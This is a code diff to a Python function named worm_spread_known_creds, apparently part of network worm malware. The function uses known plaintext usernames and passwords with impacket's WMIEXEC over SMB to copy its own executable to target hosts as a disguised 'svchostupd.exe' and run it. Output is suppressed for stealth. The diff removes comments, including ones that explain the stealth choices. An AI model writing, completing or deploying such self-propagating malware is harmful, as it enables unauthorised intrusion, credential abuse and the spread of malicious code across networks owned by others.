@@ -108,7 +108,6 @@ def worm_spread_known_creds():
 
     print(f"[WORM] Found {len(live_hosts)} potential targets")
 
-    # Your own executable path
     self_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
     self_name = os.path.basename(self_path)
 
@@ -116,8 +115,7 @@ def worm_spread_known_creds():
         try:
             print(f"[WORM] Attempting {target} as {username}:{password}")
 
-            # Simple payload: copy self via SMB + execute
-            # In real attacks → often use PowerShell download cradle for stealth
+          
             remote_cmd = (
                 f'copy "\\\\{local_ip}\\C$\\path\\to\\{self_name}" '
                 f'"C:\\Windows\\Temp\\svchostupd.exe" >nul 2>&1 & '
@@ -127,11 +125,11 @@ def worm_spread_known_creds():
             executer = WMIEXEC(
                 command=remote_cmd,
                 username=username,
-                password=password,          # ← using known plaintext
+                password=password,         
                 domain=domain,
-                hashes=None,                # not needed when plaintext is known
+                hashes=None,                
                 share="ADMIN$",
-                noOutput=True,              # suppress output for stealth
+                noOutput=True,             
                 doKerberos=False
             )
 
